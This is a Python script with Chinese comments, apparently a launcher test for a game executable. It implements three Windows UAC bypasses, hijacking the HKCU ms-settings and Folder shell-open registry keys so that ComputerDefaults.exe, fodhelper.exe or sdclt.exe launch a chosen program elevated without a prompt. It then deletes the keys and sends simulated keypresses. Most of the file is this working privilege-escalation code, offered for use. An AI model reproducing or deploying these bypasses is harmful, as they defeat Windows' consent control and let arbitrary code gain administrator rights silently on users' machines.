"""
启动器测试 — 真正的 UAC 绕过 + 模拟按键序列

原理:
  Windows 有若干系统 exe 标记了 autoElevate=true (如 ComputerDefaults.exe),
  它们启动时自动提权且不弹 UAC。这些 exe 会读取 HKCU 下的特定注册表键
  来获取要执行的命令。我们通过修改注册表, 让它们替我们启动目标 exe。

方法 (按优先级回退):
  1. ComputerDefaults.exe  → HKCU\Software\Classes\ms-settings\Shell\Open\command
  2. fodhelper.exe         → 同上 (功能相同, 不同 exe)
  3. sdclt.exe             → HKCU\Software\Classes\Folder\shell\open\command
"""
import subprocess, time, os, sys, ctypes
from ctypes import wintypes

EXE_PATH = r"E:\Project\DeadMaze\Dead Maze Steam加速版.exe"
TASK_NAME = "DeadMazeLauncher"

user32 = ctypes.windll.user32
VK_CODES = {"insert": 0x2D, "delete": 0x2E, "f1": 0x70, "f3": 0x72, "pageup": 0x21, "pagedown": 0x22}


def press_key(vk_code):
    """SendInput 发送单个按键"""
    class KEYBDINPUT(ctypes.Structure):
        _fields_ = [("wVk", wintypes.WORD), ("wScan", wintypes.WORD),
                    ("dwFlags", wintypes.DWORD), ("time", wintypes.DWORD),
                    ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))]
    class INPUT_U(ctypes.Union):
        _fields_ = [("ki", KEYBDINPUT), ("mi", ctypes.c_char * 32)]
    class INPUT(ctypes.Structure):
        _fields_ = [("type", wintypes.DWORD), ("u", INPUT_U)]
    down = INPUT(1, INPUT_U(ki=KEYBDINPUT(vk_code, 0, 0, 0, None)))
    up = INPUT(1, INPUT_U(ki=KEYBDINPUT(vk_code, 0, 2, 0, None)))
    user32.SendInput(1, ctypes.byref(down), ctypes.sizeof(INPUT))
    time.sleep(0.05)
    user32.SendInput(1, ctypes.byref(up), ctypes.sizeof(INPUT))


# ============================================================
# UAC 绕过方法
# ============================================================

def _try_computerdefaults(exe_path):
    """
    方法1: ComputerDefaults.exe 自动提权
    成功率最高, Win10/11 均适用
    """
    import winreg
    KEY_PATH = r"Software\Classes\ms-settings\Shell\Open\command"

    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, KEY_PATH)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, exe_path)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)

        subprocess.Popen(r"C:\Windows\System32\ComputerDefaults.exe")
        print("[UAC绕过] ComputerDefaults.exe 启动...")
        return True
    except Exception as e:
        print(f"[UAC绕过] ComputerDefaults 失败: {e}")
        return False


def _try_fodhelper(exe_path):
    """
    方法2: fodhelper.exe 自动提权
    Win10/11 备用方案 (部分新版本已修复)
    """
    import winreg
    KEY_PATH = r"Software\Classes\ms-settings\Shell\Open\command"

    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, KEY_PATH)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, exe_path)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)

        subprocess.Popen(r"C:\Windows\System32\fodhelper.exe")
        print("[UAC绕过] fodhelper.exe 启动...")
        return True
    except Exception as e:
        print(f"[UAC绕过] fodhelper 失败: {e}")
        return False


def _try_sdclt(exe_path):
    """
    方法3: sdclt.exe (备份和还原) 自动提权
    使用不同的注册表路径, 可作为前两种的备选
    """
    import winreg
    KEY_PATH = r"Software\Classes\Folder\shell\open\command"

    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, KEY_PATH)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)

        subprocess.Popen(r"C:\Windows\System32\sdclt.exe")
        print("[UAC绕过] sdclt.exe 启动...")
        return True
    except Exception as e:
        print(f"[UAC绕过] sdclt 失败: {e}")
        return False


def _cleanup_registry():
    """清理 UAC 绕过留下的注册表键"""
    import winreg
    paths = [
        r"Software\Classes\ms-settings\Shell\Open\command",
        r"Software\Classes\Folder\shell\open\command",
    ]
    for p in paths:
        try:
            # 逐级删除
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, p)
        except FileNotFoundError:
            pass  # 不存在, 无需清理
        except Exception:
            # 可能有子键, 尝试递归删除
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, p + r"\DelegateExecute")
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, p)
            except Exception:
                pass


def launch_no_uac(exe_path):
    """
    真正的 UAC 绕过启动
    依次尝试 ComputerDefaults → fodhelper → sdclt
    """
    if not os.path.exists(exe_path):
        print(f"[跳过] 文件不存在: {exe_path}")
        return False

    # 先清理残留的注册表键
    _cleanup_registry()

    # 依次尝试各方法
    methods = [
        ("ComputerDefaults", _try_computerdefaults),
        ("fodhelper", _try_fodhelper),
        ("sdclt", _try_sdclt),
    ]

    for name, method in methods:
        print(f"[UAC绕过] 尝试方法: {name}...")
        if method(exe_path):
            print(f"[UAC绕过] ✓ {name} 成功")
            time.sleep(10.0)

            # 清理注册表 (目标exe已启动)
            _cleanup_registry()
            return True
        else:
            print(f"[UAC绕过] ✗ {name} 失败, 尝试下一个...")

    print("[UAC绕过] 所有方法均失败, 回退到直接启动")
    subprocess.Popen(exe_path, shell=True)
    time.sleep(10.0)
    return True


def run_sequence():
    sequence = ["insert", "delete", "f1", "f3", "f3", "f3", "pageup", "pagedown"]
    for i, key in enumerate(sequence):
        vk = VK_CODES[key]
        print(f"[{i+1}/{len(sequence)}] 按 {key.upper()} ...")
        press_key(vk)
        print(f"       等待2秒...")
        time.sleep(2.0)
    print("序列完成!")


if __name__ == "__main__":
    print("=== 启动器测试 (UAC绕过: ComputerDefaults/fodhelper/sdclt) ===")
    print(f"EXE: {EXE_PATH}")
    launch_no_uac(EXE_PATH)
    run_sequence()
    print("测试完成!")
